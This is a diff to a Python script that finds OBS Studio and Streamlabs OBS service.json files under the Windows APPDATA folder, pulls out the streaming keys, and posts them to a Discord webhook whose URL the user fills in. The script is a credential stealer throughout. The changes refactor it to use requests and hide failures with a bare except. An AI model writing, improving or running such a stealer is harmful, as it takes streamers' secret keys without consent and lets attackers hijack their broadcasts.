@@ -1,37 +1,51 @@
 import os
-import re
 import json
-from discord_webhook import DiscordWebhook, DiscordEmbed
-from urllib.request import Request, urlopen
-import os.path
-from os import path
+import requests
+
+
 #enter you webhook url here
 WEBHOOK_URL = ""
 
 
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
+def getKeys(path):
+    with open(path) as f:
+            path = json.load(f)
+            key = path.get("settings").get('key')
+    return key
 
-SLOBS = roaming + '\\slobs-client\\service.json'
-OBS = roaming + '\\obs-studio\\basic\\profiles\\Untitled\\service.json'
+def main(WEBHOOK_URL):
 
-if path.exists(f"{OBS}"):
-    obs = open(f"{OBS}" , "r")
-    obskey = obs.read()
-    obs.close()
-    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**OBS** ```json\n{obskey}```"))
-    response = f.execute()
-else:
-    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**OBS** ```json\n OBS Not Found```"))
-    response = f.execute()
+    roaming = os.getenv('APPDATA')
 
-if path.exists(f"{SLOBS}"):
-    slobs = open(f"{SLOBS}", "r")
-    slobskey = slobs.read()
-    slobs.close()
-    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**SLOBS** ```json\n{slobskey}```"))
-    response = f.execute()
-else:
-    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**SLOBS** ```json\n SLOBS Not Found```"))
-    response = f.execute()
+    paths = {
+        'SLOBS' : roaming + '\\slobs-client\\service.json',
+        'OBS' : roaming + '\\obs-studio\\basic\\profiles\\Untitled\\service.json'
+    }
 
+    message = ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        
+        message += f'\n**{platform}**\n```\n'
+
+        keys = getKeys(path)
+
+        if len(keys) > 0:
+            for key in keys:
+                message += f'{key}'
+        else:
+            message += 'No keys found.\n'
+
+        message += '```'
+
+    try:
+        requests.post(WEBHOOK_URL, json = {'content' : f'{message}'})
+    except:
+        pass
+        
+    
+
+if __name__ == '__main__':
+    main(WEBHOOK_URL)
